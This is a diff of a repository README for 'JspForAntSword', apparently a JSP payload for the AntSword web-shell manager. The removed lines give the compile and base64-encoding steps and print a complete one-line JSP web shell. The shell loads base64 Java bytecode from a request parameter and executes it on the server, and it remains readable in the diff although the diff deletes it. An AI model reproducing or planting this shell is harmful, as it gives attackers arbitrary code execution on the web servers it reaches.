@@ -1,33 +1,3 @@
-# JspForAntSword
-中国蚁剑JSP一句话Payload
-
-详细介绍： https://yzddmr6.tk/posts/antsword-diy-3/
-
-环境： jdk1.6  tomcat7
-
-编译命令
-
-```
-javac -cp "D:/xxxx/lib/servlet-api.jar;D:/xxx/lib/jsp-api.jar" Test.java
-```
-
-保存编译后的class字节码
-
-```
-base64 -w 0 Test.class > Test.txt
-```
-
-Shell：
-
-```
-<%!class U extends ClassLoader{ U(ClassLoader c){ super(c); }public Class g(byte []b){ return super.defineClass(b,0,b.length); }}%><% String cls=request.getParameter("ant");if(cls!=null){ new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); }%>
-```
-
-
-
-Demo.java
-
-```
 import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
 import javax.servlet.jsp.PageContext;
@@ -91,6 +61,3 @@ public class Demo {
     }
 
 }
-
-```
-
